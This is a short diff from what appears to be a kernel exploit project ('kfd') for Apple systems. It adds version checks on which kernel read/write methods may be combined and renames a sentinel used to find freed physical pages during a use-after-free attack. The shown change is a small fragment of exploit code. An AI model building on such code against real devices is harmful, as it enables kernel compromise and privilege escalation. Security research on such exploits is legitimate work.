@@ -70,6 +70,14 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 
 void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
 {
+    if (!kern_versions[kfd->info.env.vid].kread_kqueue_workloop_ctl_supported) {
+        assert(kread_method != kread_kqueue_workloop_ctl);
+    }
+
+    if (kread_method == kread_sem_open) {
+        assert(kwrite_method == kwrite_sem_open);
+    }
+
     switch (kread_method) {
         kread_method_case(kread_kqueue_workloop_ctl)
         kread_method_case(kread_sem_open)
@@ -135,7 +143,7 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
         u64 grabbed_puaf_pages = 0;
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
-            if (!memcmp(copy_sentinel, (void*)(puaf_page_uaddr), copy_sentinel_size)) {
+            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
                     timer_end();
